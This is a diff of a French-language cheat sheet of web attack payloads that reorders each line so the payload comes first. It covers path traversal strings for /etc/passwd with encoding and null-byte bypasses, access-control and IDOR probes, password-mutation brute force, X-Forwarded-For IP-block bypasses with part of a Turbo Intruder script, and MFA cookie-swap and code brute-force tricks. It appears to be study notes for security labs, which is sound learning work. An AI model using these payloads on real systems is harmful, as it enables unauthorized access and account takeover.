@@ -5,28 +5,28 @@ statut: en cours
 # Fiche de payloads par vulnérabilité
 
 ### Path traversal ([[Path-traversal]])
-- Traversal simple (Unix) : `../../../etc/passwd`
-- Traversal simple (Windows) : `..\..\..\windows\win.ini`
-- Séquences imbriquées (contournement d'un retrait non récursif de `../`) : `....//` ou `....\/`
-- Encodage simple : `%2e%2e%2f`
-- Double encodage : `%252e%252e%252f`
-- Encodage non standard : `%c0%af` ou `..%ef%bc%8f`
-- Contournement validation de préfixe (chemin absolu) : `filename=/var/www/images/../../../etc/passwd`
-- Contournement validation d'extension (null byte) : `filename=../../../etc/passwd%00.png`
+- `../../../etc/passwd` — traversal simple (Unix)
+- `..\..\..\windows\win.ini` — traversal simple (Windows)
+- `....//` ou `....\/` — séquences imbriquées (contournement d'un retrait non récursif de `../`)
+- `%2e%2e%2f` — encodage simple
+- `%252e%252e%252f` — double encodage
+- `%c0%af` ou `..%ef%bc%8f` — encodage non standard
+- `filename=/var/www/images/../../../etc/passwd` — contournement validation de préfixe (chemin absolu)
+- `filename=../../../etc/passwd%00.png` — contournement validation d'extension (null byte)
 - Liste Burp Intruder dédiée : **Fuzzing - path traversal**
 
 ### Access control ([[Access-control]])
-- Accès direct à une fonction non liée dans l'UI : deviner/forcer l'URL, ex. `/admin`, `/administrator-panel-<suffixe>`
-- Emplacements où chercher une URL sensible divulguée : `/robots.txt`, `sitemap.xml`, code JavaScript de l'interface
-- Contournement par paramètre de rôle contrôlable côté client : `?admin=true`, `?role=1`
-- Escalade horizontale / IDOR par manipulation d'identifiant : `?id=123` à tester avec d'autres valeurs (`?id=124`, `?id=1`, etc.) sous un compte différent
-- Ne pas se limiter au verbe HTTP utilisé par l'UI : rejouer la même requête en GET/POST/PUT/DELETE sur l'endpoint sensible
+- `/admin`, `/administrator-panel-<suffixe>` — accès direct à une fonction non liée dans l'UI
+- `/robots.txt`, `/sitemap.xml` — emplacements où chercher une URL sensible divulguée (voir aussi le code JS de l'interface)
+- `?admin=true`, `?role=1` — contournement par paramètre de rôle contrôlable côté client
+- `?id=123` → `?id=124`, `?id=1` — escalade horizontale / IDOR par manipulation d'identifiant, à tester sous un compte différent
+- `GET` / `POST` / `PUT` / `DELETE` sur le même endpoint — ne pas se limiter au verbe HTTP utilisé par l'UI
 
 ### Authentication ([[Authentication]])
-- Noms d'utilisateur à tester en priorité : `admin`, `administrator`, schéma `prenom.nom@domaine`
-- Mutations de mot de passe prévisibles à tester en brute force ciblé : `Password1!`, `Passw0rd`, `<motclé><année>!`, substitutions leet (`o`→`0`, `a`→`4`, `e`→`3`)
-- En-tête pour contourner un blocage par IP : `X-Forwarded-For: <ip aléatoire>` (tester aussi `X-Real-IP`, `X-Client-IP`, `True-Client-IP`)
-- Authentification HTTP Basic : `Authorization: Basic base64(username:password)`
+- `admin`, `administrator`, `prenom.nom@domaine` — noms d'utilisateur à tester en priorité
+- `Password1!`, `Passw0rd`, `<motclé><année>!` — mutations de mot de passe prévisibles (substitutions leet : `o`→`0`, `a`→`4`, `e`→`3`)
+- `X-Forwarded-For: <ip aléatoire>` — contournement de blocage IP (tester aussi `X-Real-IP`, `X-Client-IP`, `True-Client-IP`)
+- `Authorization: Basic base64(username:password)` — authentification HTTP Basic
 - Script Turbo Intruder pour bypass de blocage IP (1 seul marqueur position password, IP injectée par remplacement de texte sur `target.req`) :
   ```python
   def queueRequests(target, wordlists):
@@ -49,7 +49,7 @@ statut: en cours
   ```
 
 ### Multi-factor authentication ([[Multi-factor-authentication]])
-- Cookie de liaison d'identité entre étapes à manipuler : `Cookie: account=carlos` → `Cookie: account=victim-user`
-- Brute force du code de vérification (4-6 chiffres) : Burp Intruder, attaque Sniper, payload type Numbers, plage `0000`-`9999` (ou `000000`-`999999`)
-- Réponse de vérification à surveiller/manipuler si la décision est côté client : `"verified":false` → `"verified":true`
-- Accès direct après étape 1 : forcer la navigation vers une URL post-connexion sans jamais soumettre le code (ex: `/my-account`)
+- `Cookie: account=carlos` → `Cookie: account=victim-user` — manipulation du cookie de liaison d'identité entre étapes
+- `0000`-`9999` ou `000000`-`999999` — brute force du code de vérification (Burp Intruder, attaque Sniper, payload type Numbers)
+- `"verified":false` → `"verified":true` — réponse de vérification à surveiller/manipuler si la décision est côté client
+- `/my-account` — accès direct après l'étape 1, en forçant la navigation vers une URL post-connexion sans jamais soumettre le code
